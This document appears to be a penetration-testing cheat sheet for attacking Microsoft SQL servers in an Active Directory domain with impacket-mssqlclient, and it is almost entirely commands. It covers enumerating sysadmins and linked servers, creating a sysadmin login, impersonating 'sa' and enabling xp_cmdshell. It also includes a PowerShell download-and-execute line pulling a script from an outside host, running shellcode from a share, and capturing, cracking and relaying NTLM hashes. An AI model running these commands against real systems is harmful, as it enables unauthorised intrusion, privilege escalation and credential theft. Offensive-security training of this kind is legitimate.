---
title: "Impacket-MSSQL"
source_url: https://vulnableone.gitbook.io/vulnableone/offensive-treasure/ad-attack/ms-sql-servers/impacket-mssql
fetched_at: 2026-09-20T07:24:55Z
license: unspecified
category: ad
---

Login with Windows-Auth

`└─$ impacket-mssqlclient vulnableone.local/khan.chanthou@10.10.10.10 -windows-auth`
## First Instance

```
# Enumeration
SQL> select @@servername
SQL> select loginname from syslogins where sysadmin = 1
SQL> exec sp_linkedservers
SQL> exec sp_helplinkedsrvlogin
SQL> SELECT srvname, srvproduct, rpcout FROM master..sysservers
# Create User
SQL> CREATE LOGIN laughnig WITH PASSWORD = 'ThisisPassword'
SQL> EXEC sp_addsrvrolemember 'laughing', 'sysadmin'
# Impersonate
SQL> SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
SQL> EXECUTE AS login = 'sa'; SELECT IS_SRVROLEMEMBER('sysadmin')
# Enable RPC Out
SQL> EXEC sp_serveroption 'appsrv01','rpc out','True'
# Verify Xp_cmdshell
SQL> SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured FROM sys.configurations WHERE name = 'xp_cmdshell';
# Enable Xp_cmdshell
SQL> EXEC sp_configure 'show advanced options', 1;RECONFIGURE;exec SP_CONFIGURE 'xp_cmdshell', 1;RECONFIGURE
SQL> enable_xp_cmdshell
# Execute Xp_cmdshell
SQL> EXEC xp_cmdshell "powershell IEX (new-object net.webclient).downloadstring('http://192.168.45.158/run.txt')"
SQL> EXEC xp_cmdshell "\\10.10.10.10\share\Shellcode.exe";
# UNC Path
SQL> EXEC xp_dirtree '\\10.10.10.10\test'
└─$ sudo responder -I tun0 -v    #Capture Hash
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt    #CrackHash
└─$ impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.10.10    #NTLM Relay
```
## Second Instance

## Third Instance

Last updated

Was this helpful?
